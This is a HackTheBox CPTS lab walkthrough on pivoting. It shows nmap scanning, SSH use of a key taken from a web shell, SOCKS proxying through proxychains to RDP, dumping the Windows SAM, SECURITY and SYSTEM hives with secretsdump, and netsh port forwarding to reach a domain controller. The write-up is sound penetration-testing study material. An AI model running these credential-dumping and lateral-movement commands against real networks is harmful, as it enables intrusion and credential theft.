
# HTB CPTS - Pivoting, Tunneling, and Port Forwarding - Skills Assessment Walkthrough - Target: 10.129.229.129

## **1. Target Information**
- **Primary Target IP:** `10.129.229.129`
- **Internal Host Discovered:** `172.16.5.35`
- **Discovered Services:**  
  - **Port 22 (SSH)**
  - **Port 80 (HTTP - Web Shell)**

---

## **2. Initial Enumeration**
### **Nmap Scan**
Performed a service and version scan:

```bash
nmap -sC -sV -oN initial_scan.txt 10.129.229.129
```

#### **Results:**
```
22/tcp   open  ssh    OpenSSH X.X (protocol 2.0)
80/tcp   open  http   Apache httpd X.X
```

---

## **3. Website Enumeration**
### **Discoveries:**
- Browsed to `http://10.129.229.129/` and found an **active web shell**.
- Extracted:
  - **User:** `webadmin`
  - **SSH Private Key:** `id_rsa`
  - **Credentials:** `mlefay:Plain Human work!`

---

## **4. Gaining Initial Access**
### **Using SSH Key for Access**
Attempted SSH login with the extracted key:

```bash
chmod 600 id_rsa
ssh -i id_rsa webadmin@10.129.229.129
```

✅ **Access granted as `webadmin`!**

---

## **5. Internal Network Enumeration**
### **Ping Sweeping for Hosts**
Discovered an internal host:

```bash
for ip in {1..254}; do ping -c 1 172.16.5.$ip | grep "64 bytes"; done
```

🔍 **Active Host Identified:** `172.16.5.35`

---

## **6. Pivoting with Proxychains & RDP**
### **Port Forwarding Setup**
Configured SSH dynamic port forwarding:

```bash
ssh -D 5050 -i id_rsa webadmin@10.129.229.129
```

Modified **proxychains.conf** file to use `socks5` instead of `socks4`:

```bash
sudo nano /etc/proxychains.conf
```

Changed the last line to:
```
socks5  127.0.0.1 5050
```

Used **proxychains** and **RDP** to pivot into the internal host:

```bash
proxychains xfreerdp /u:mlefay /p:"Plain Human work!" /v:172.16.5.35
```

✅ **Successfully accessed the machine and found the flag:**

```
REDACTED
```

---

## **7. Extracting Windows Hashes**
Saved key registry files and extracted hashes:

```bash
copy C:\Windows\System32\config\SAM sam.save
copy C:\Windows\System32\config\SECURITY security.save
copy C:\Windows\System32\config\SYSTEM system.save
```

### **Mounting a Shared Folder on Kali**
Transferred files to a mounted share on Kali:

```bash
mkdir /mnt/share
sudo mount -t cifs //target_ip/share /mnt/share -o username=webadmin,password=<password>
```

Transferred files:

```bash
cp sam.save /mnt/share/
cp security.save /mnt/share/
cp system.save /mnt/share/
```

Extracted hashes using Impacket:

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

🔍 **Found vfranks' Password!**

---

## **8. Port Forwarding & Domain Controller Access**
### **Setting up Netcat Port Forwarding**

```bash
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=target_ip
```

✅ **Connected via RDP using `vfranks` credentials** and gained access to the **Domain Controller**.

### **Final Flag Found on DC!**

---

## **9. Notes & Learnings**
- 🔹 **Web shells often expose critical credentials. Always check HTTP services.**
- 🔹 **SSH private keys can provide easy footholds if misconfigured.**
- 🔹 **Proxychains and dynamic port forwarding help enumerate internal hosts.**
- 🔹 **Dumping Windows registry files can reveal user credentials for lateral movement.**

---

**📝 Author:** _Jack Misbach_ 
**📅 Date:** _1/30/25_  

